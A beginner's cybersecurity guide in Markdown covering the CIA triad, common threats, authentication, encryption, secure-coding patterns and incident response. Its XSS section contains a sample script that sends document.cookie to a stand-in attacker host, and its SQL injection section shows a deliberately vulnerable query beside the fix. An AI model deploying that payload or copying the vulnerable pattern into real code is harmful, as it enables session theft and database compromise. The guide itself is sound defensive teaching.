# Cyber Security Basics

Cyber security is the practice of protecting systems, networks, and programs from digital attacks. These attacks are usually aimed at accessing, changing, or destroying sensitive information, extorting money from users, or interrupting normal business processes.

## Core Principles (CIA Triad)

### 1. Confidentiality
Ensuring that information is accessible only to authorized individuals.

**Techniques:**
- Encryption (AES, RSA)
- Access controls
- Authentication mechanisms
- Data classification

### 2. Integrity
Maintaining the accuracy and completeness of data.

**Techniques:**
- Hashing (SHA-256, MD5)
- Digital signatures
- Checksums
- Version control

### 3. Availability
Ensuring that authorized users have access to information when needed.

**Techniques:**
- Redundancy
- Backups
- DDoS protection
- Disaster recovery plans

## Common Threats

### 1. Malware
Malicious software designed to harm or exploit systems.

**Types:**
- **Viruses**: Self-replicating programs that attach to files
- **Trojans**: Disguised as legitimate software
- **Ransomware**: Encrypts data and demands payment
- **Spyware**: Secretly monitors user activity
- **Worms**: Self-replicating across networks

### 2. Phishing
Fraudulent attempts to obtain sensitive information by disguising as trustworthy entities.

**Example:**
```
From: security@paypa1.com (note the "1" instead of "l")
Subject: Urgent: Verify Your Account

Your account has been compromised. Click here to verify:
http://fake-paypal-site.com/verify
```

### 3. SQL Injection
Inserting malicious SQL code into application queries.

**Vulnerable Code:**
```python
# BAD - Vulnerable to SQL injection
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

**Secure Code:**
```python
# GOOD - Using parameterized queries
username = request.form['username']
password = request.form['password']
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, password))
```

### 4. Cross-Site Scripting (XSS)
Injecting malicious scripts into web pages viewed by other users.

**Example Attack:**
```javascript
// Attacker injects this into a comment field
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Prevention:**
```javascript
// Sanitize user input
function sanitize(input) {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
```

### 5. Man-in-the-Middle (MITM)
Intercepting communication between two parties.

**Prevention:**
- Use HTTPS/TLS
- Certificate pinning
- VPN usage
- Avoid public Wi-Fi for sensitive operations

## Authentication & Authorization

### Password Security

**Bad Practices:**
```python
# NEVER store passwords in plain text
user.password = request.form['password']
```

**Good Practices:**
```python
import bcrypt

# Hash password before storing
password = request.form['password']
hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
user.password_hash = hashed

# Verify password
if bcrypt.checkpw(password.encode('utf-8'), user.password_hash):
    # Password is correct
    pass
```

### Multi-Factor Authentication (MFA)

**Implementation Example:**
```python
import pyotp

# Generate secret key for user
secret = pyotp.random_base32()

# Generate QR code for authenticator app
totp = pyotp.TOTP(secret)
qr_code = totp.provisioning_uri(user.email, issuer_name="MyApp")

# Verify OTP
def verify_otp(user_secret, user_otp):
    totp = pyotp.TOTP(user_secret)
    return totp.verify(user_otp)
```

### JWT (JSON Web Tokens)

```python
import jwt
from datetime import datetime, timedelta

# Create token
def create_token(user_id):
    payload = {
        'user_id': user_id,
        'exp': datetime.utcnow() + timedelta(hours=24),
        'iat': datetime.utcnow()
    }
    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')

# Verify token
def verify_token(token):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        return payload['user_id']
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None
```

## Network Security

### Firewall Rules Example

```bash
# Allow SSH from specific IP
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT

# Allow HTTP and HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Drop all other incoming traffic
iptables -A INPUT -j DROP
```

### SSL/TLS Configuration

```nginx
# Nginx SSL configuration
server {
    listen 443 ssl http2;
    server_name example.com;

    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    # Strong SSL protocols
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=31536000" always;
}
```

## Secure Coding Practices

### Input Validation

```python
import re

def validate_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

def validate_phone(phone):
    pattern = r'^\+?1?\d{9,15}$'
    return re.match(pattern, phone) is not None

def sanitize_filename(filename):
    # Remove path traversal attempts
    return os.path.basename(filename)
```

### CSRF Protection

```python
# Flask example
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'
csrf = CSRFProtect(app)

# In HTML form
# <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
```

### Security Headers

```python
# Flask security headers
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

## Encryption

### Symmetric Encryption (AES)

```python
from cryptography.fernet import Fernet

# Generate key
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt
message = b"Secret message"
encrypted = cipher.encrypt(message)

# Decrypt
decrypted = cipher.decrypt(encrypted)
```

### Asymmetric Encryption (RSA)

```python
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

# Generate key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# Encrypt with public key
message = b"Secret message"
encrypted = public_key.encrypt(
    message,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# Decrypt with private key
decrypted = private_key.decrypt(
    encrypted,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)
```

## Security Testing Tools

### 1. Nmap (Network Scanner)
```bash
# Scan for open ports
nmap -sV 192.168.1.1

# Scan entire subnet
nmap -sn 192.168.1.0/24
```

### 2. Wireshark (Packet Analyzer)
Captures and analyzes network traffic in real-time.

### 3. Burp Suite (Web Security Testing)
Intercepts and modifies HTTP/HTTPS traffic for testing.

### 4. OWASP ZAP (Web App Scanner)
Automated security testing for web applications.

## Incident Response

### Steps:
1. **Preparation**: Have incident response plan ready
2. **Identification**: Detect and confirm security incident
3. **Containment**: Limit the damage and prevent spread
4. **Eradication**: Remove the threat from systems
5. **Recovery**: Restore systems to normal operation
6. **Lessons Learned**: Document and improve processes

## Compliance & Standards

- **GDPR**: General Data Protection Regulation (EU)
- **HIPAA**: Health Insurance Portability and Accountability Act (US Healthcare)
- **PCI DSS**: Payment Card Industry Data Security Standard
- **ISO 27001**: Information Security Management
- **NIST**: National Institute of Standards and Technology Framework
- **SOC 2**: Service Organization Control 2

## Best Practices

1. **Keep Software Updated**: Regular patches and updates
2. **Principle of Least Privilege**: Grant minimum necessary access
3. **Defense in Depth**: Multiple layers of security
4. **Regular Backups**: Automated and tested backups
5. **Security Awareness Training**: Educate users
6. **Strong Password Policy**: Enforce complexity requirements
7. **Monitor and Log**: Track system activities
8. **Encrypt Sensitive Data**: Both at rest and in transit
9. **Regular Security Audits**: Periodic assessments
10. **Incident Response Plan**: Prepared and tested

## Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CIS Controls](https://www.cisecurity.org/controls)
- [SANS Security Resources](https://www.sans.org/security-resources/)

---

- Go back to [Cyber Security](./index.md)
- Return to [Home](../../index.md)